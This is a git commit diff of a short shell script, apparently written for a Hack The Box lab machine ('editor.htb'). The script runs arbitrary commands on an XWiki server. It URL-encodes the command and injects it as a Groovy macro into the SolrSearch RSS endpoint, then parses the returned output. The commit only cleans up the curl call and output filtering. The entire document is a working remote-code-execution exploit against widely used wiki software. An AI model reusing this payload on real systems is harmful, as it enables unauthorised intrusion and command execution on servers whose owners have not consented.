d66ab9a027cb77c2a517662f04d0331b10059c9a
David Hempston <cyber_veio@hotmail.com>
2025-11-25 17:19:10 +0000

    Clean up

--- easy/editor/remote_cmd.sh
+++ easy/editor/remote_cmd.sh
@@ -3,6 +3,6 @@
 cmd=$1
 encoded_cmd=$(python -c "from urllib import parse; print(parse.quote('${cmd}'))")
 echo $encoded_cmd
-rtn=$(curl -vv "http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22${encoded_cmd}%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d")
-#echo "$rtn" | grep "description.*\/description" -o | sed 's/<br\/>/\n/g'
-echo "$rtn"
+rtn=$(curl "http://wiki.editor.htb/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dprintln(%22${encoded_cmd}%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d")
+echo "$rtn" | grep "description.*\/description" -o | sed 's/<br\/>/\n/g'
+
